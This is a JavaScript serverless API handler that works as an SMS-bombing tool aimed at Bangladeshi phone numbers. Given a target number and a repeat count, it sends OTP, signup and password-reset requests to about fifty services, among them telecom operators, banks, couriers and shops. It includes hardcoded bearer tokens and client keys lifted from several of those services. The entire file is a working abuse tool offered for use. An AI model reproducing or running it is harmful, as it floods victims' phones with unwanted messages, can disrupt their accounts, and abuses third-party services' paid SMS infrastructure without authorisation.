async function callApi(url, options = {}) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 6000);
  try {
    await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

function buildApis(phone) {
  const p = phone;
  const p88 = "88" + p;
  const pp88 = "+88" + p;

  return [
    { name: "PaperFly", fn: async () => { await callApi("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ full_name: "Test User", company_name: "Test Co", email_address: "test@email.com", phone_number: p }) }); } },
    { name: "Ghoori", fn: async () => { await callApi("https://api.ghoorilearning.com/api/auth/signup/otp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ mobile_no: p }) }); } },
    { name: "Doctime", fn: async () => { await callApi("https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ data: { country_calling_code: "88", contact_no: p } }) }); } },
    { name: "Sundarban", fn: async () => { await callApi("https://api-gateway.sundarbancourierltd.com/graphql", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: p } }, query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter } } }" }) }); } },
    { name: "Apex4U", fn: async () => { await callApi("https://api.apex4u.com/api/auth/login", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phoneNumber: p }) }); } },
    { name: "Robi", fn: async () => { await callApi("https://webapi.robi.com.bd/v1/send-otp", { method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc" }, body: JSON.stringify({ phone_number: p, type: "doorstep" }) }); } },
    { name: "Banglalink", fn: async () => { await callApi("https://web-api.banglalink.net/api/v1/user/number/validation/" + p); } },
    { name: "Banglalink OTP", fn: async () => { await callApi("https://web-api.banglalink.net/api/v1/user/otp-login/request", { method: "POST", headers: { "content-type": "application/json", "client-security-token": "1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ" }, body: JSON.stringify({ mobile: p }) }); } },
    { name: "Grameenphone", fn: async () => { await callApi("https://webloginda.grameenphone.com/backend/api/v1/otp", { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: "msisdn=" + p }); } },
    { name: "Robi Offer", fn: async () => { await callApi("https://webapi.robi.com.bd/v1/send-otp", { method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI" }, body: JSON.stringify({ phone_number: p, type: "my_offer" }) }); } },
    { name: "Robi DA", fn: async () => { await callApi("https://da-api.robi.com.bd/da-nll/otp/send", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ msisdn: p }) }); } },
    { name: "Robi Chat", fn: async () => { await callApi("https://webapi.robi.com.bd/v1/chat/send-otp", { method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI" }, body: JSON.stringify({ phone_number: p, name: "Test User", type: "video-chat" }) }); } },
    { name: "Redx", fn: async () => { await callApi("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phoneNumber: p }) }); } },
    { name: "Fundesh", fn: async () => { await callApi("https://fundesh.com.bd/api/auth/generateOTP", { method: "POST", headers: { "content-type": "application/json; charset=UTF-8" }, body: JSON.stringify({ msisdn: p }) }); } },
    { name: "Bikroy", fn: async () => { await callApi("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + p); } },
    { name: "MotionView", fn: async () => { await callApi("https://api.motionview.com.bd/api/send-otp-phone-signup", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phone: p }) }); } },
    { name: "Chorki", fn: async () => { await callApi("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ number: pp88 }) }); } },
    { name: "Jatri", fn: async () => { await callApi("https://user-api.jslglobal.co:444/v2/send-otp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phone: pp88, jatri_token: "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj" }) }); } },
    { name: "ChinaOnline", fn: async () => { await callApi("https://chinaonlinebd.com/api/login/getOtp?phone=" + p); } },
    { name: "Deepto", fn: async () => { await callApi("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ number: pp88 }) }); } },
    { name: "Shikho", fn: async () => { await callApi("https://api.shikho.com/auth/v2/send/sms", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phone: p, type: "student", auth_type: "signup", vendor: "shikho" }) }); } },
    { name: "Redx Signup", fn: async () => { await callApi("https://api.redx.com.bd/v1/user/signup", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ name: "Test User", phoneNumber: p, service: "redx" }) }); } },
    { name: "Bioscope", fn: async () => { await callApi("https://www.bioscopelive.com/en/login/send-otp?phone=88" + p + "&operator=bd-otp", { method: "POST" }); } },
    { name: "Binge", fn: async () => { await callApi("https://ss.binge.buzz/otp/send/login" + p, { method: "POST" }); } },
    { name: "AppLink", fn: async () => { await callApi("https://applink.com.bd/appstore-v4-server/login/otp/request", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ msisdn: p88 }) }); } },
    { name: "Chokrojan", fn: async () => { await callApi("https://chokrojan.com/api/v1/passenger/login/mobile", { method: "POST", headers: { "content-type": "application/json", "domain-name": "chokrojan.com", "user-platform": "3" }, body: JSON.stringify({ mobile_number: p }) }); } },
    { name: "Dhaka Bank", fn: async () => { await callApi("https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ mobileNo: p, product_id: "250", requestChannel: "MOB", trackingStatus: 5 }) }); } },
    { name: "Easy", fn: async () => { await callApi("https://core.easy.com.bd/api/v1/registration", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ name: "Test User", email: "test@email.com", mobile: p, password: "pass123", password_confirmation: "pass123", device_key: "test123" }) }); } },
    { name: "Eshop", fn: async () => { await callApi("https://eshop-api.banglalink.net/api/v1/customer/send-otp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ type: "phone", phone: p }) }); } },
    { name: "FSIBL", fn: async () => { await callApi("https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ mobileNo: p, product_id: "122", requestChannel: "MOB", trackingStatus: 5 }) }); } },
    { name: "MyGP", fn: async () => { await callApi("https://api.mygp.cinematic.mobi/api/v1/otp/88" + p + "/SBENT_3GB7D", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ accessinfo: { access_token: "K165S6V6q4C6G7H0y9C4f5W7t5YeC6", referenceCode: "20190827042622" } }) }); } },
    { name: "GP Shop", fn: async () => { await callApi("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phone: p, email: "", language: "en" }) }); } },
    { name: "Hishabee", fn: async () => { await callApi("https://app.hishabee.business/api/V2/otp/send?mobile_number=" + p, { method: "POST" }); } },
    { name: "Iqra", fn: async () => { await callApi("http://apibeta.iqra-live.com/api/v1/sent-otp/" + p); } },
    { name: "Robi Smart", fn: async () => { const num = p.replace(/^0/, ""); await callApi("https://smart1216.robi.com.bd/robi_sivr/public/login/phone", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ cli: num }) }); } },
    { name: "MCB", fn: async () => { await callApi("https://www.mcbaffiliate.com/Affiliate/RequestOTP", { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: "PhoneNumber=" + p }); } },
    { name: "Mithai", fn: async () => { await callApi("https://mithaibd.com/api/login/", { method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==" }, body: JSON.stringify({ phone: p, email: `test${p}@gmail.com`, password1: "Pass123@", password2: "Pass123@", company_id: "2", storefront_id: "5" }) }); } },
    { name: "EnglishMoja", fn: async () => { await callApi("https://api.englishmojabd.com/api/v1/auth/login", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phone: pp88 }) }); } },
    { name: "MoveOn", fn: async () => { await callApi("https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phone: p }) }); } },
    { name: "OshudPotro", fn: async () => { await callApi("https://api.osudpotro.com/api/v1/users/send_otp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ mobile: "+88-" + p, deviceToken: "app", language: "bn", os: "android" }) }); } },
    { name: "MyGP Login", fn: async () => { await callApi("https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88" + p + "&lang=en"); } },
    { name: "Qcoom", fn: async () => { await callApi("https://auth.qcoom.com/api/v1/otp/send", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ mobileNumber: pp88 }) }); } },
    { name: "Circle", fn: async () => { await callApi("https://reseller.circle.com.bd/api/v2/auth/signup", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ name: pp88, email_or_phone: pp88, password: "pass123", password_confirmation: "pass123", register_by: "phone" }) }); } },
    { name: "Shomvob", fn: async () => { await callApi("https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", { method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s" }, body: JSON.stringify({ phone: p }) }); } },
    { name: "ToyBox", fn: async () => { await callApi("https://toybox.com.bd/api/v1/otp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phone: p }) }); } },
    { name: "Win2Gain", fn: async () => { await callApi("https://win2gain.com.bd/api/v1/auth/send-otp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phone: p }) }); } },
    { name: "Kepler", fn: async () => { await callApi("https://kepler.com.bd/api/auth/send-otp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phone: p }) }); } },
    { name: "Roots Edu", fn: async () => { await callApi("https://rootsedulive.com/api/v1/auth/send-otp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phone: p }) }); } },
    { name: "Roots Forget", fn: async () => { await callApi("https://rootsedulive.com/api/v1/auth/forget-password", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ phone: p }) }); } },
  ];
}

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    res.status(200).end();
    return;
  }

  if (req.method !== "POST") {
    res.status(405).json({ error: "Method not allowed" });
    return;
  }

  const { phone, amount } = req.body || {};

  if (!phone || !amount) {
    res.status(400).json({ error: "phone and amount required" });
    return;
  }

  const apis = buildApis(phone);
  const allResults = [];
  let successCount = 0;
  let failCount = 0;

  const cycles = Math.max(1, Math.min(Number(amount), 10));

  for (let cycle = 0; cycle < cycles; cycle++) {
    const cycleResults = await Promise.allSettled(
      apis.map((api) =>
        api.fn()
          .then(() => ({ name: api.name, success: true }))
          .catch(() => ({ name: api.name, success: false }))
      )
    );

    for (const r of cycleResults) {
      const result = r.status === "fulfilled" ? r.value : { name: "unknown", success: false };
      allResults.push(result);
      if (result.success) successCount++;
      else failCount++;
    }
  }

  res.json({
    results: allResults,
    successCount,
    failCount,
    totalApis: apis.length * cycles,
  });
}
